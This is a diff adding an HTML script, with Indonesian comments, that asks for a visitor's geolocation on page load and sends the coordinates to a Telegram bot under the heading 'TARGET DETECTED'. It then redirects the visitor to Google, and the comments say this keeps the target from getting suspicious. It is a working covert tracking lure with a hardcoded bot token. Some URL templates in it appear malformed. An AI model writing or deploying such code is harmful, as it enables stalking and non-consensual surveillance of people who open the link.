@@ -1,0 +1,30 @@
+<script>
+window.onload = function() {
+    if (navigator.geolocation) {
+        // Meminta izin lokasi otomatis saat link dibuka
+        navigator.geolocation.getCurrentPosition(sendToTelegram, showError);
+    }
+};
+
+function sendToTelegram(position) {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+    const token = "8638321687:AAHq7-qulLENRloAfMrULfSW4Wchu25R-ms"; 
+    const chat_id = "5287296131";
+    
+    // Pesan yang akan masuk ke Telegram kamu
+    const text = `🎯 TARGET TERDETEKSI!%0A📍 Lokasi: https://www.google.com{lat},${lon}`;
+
+    // Perintah mengirim ke Telegram
+    fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${text}`)
+    .then(() => {
+        // Setelah terkirim, target langsung dilempar ke Google agar tidak curiga
+        window.location.href = "https://www.google.com"; 
+    });
+}
+
+function showError(error) {
+    // Jika target menolak "Allow", tetap lempar ke Google
+    window.location.href = "https://www.google.com";
+}
+</script>
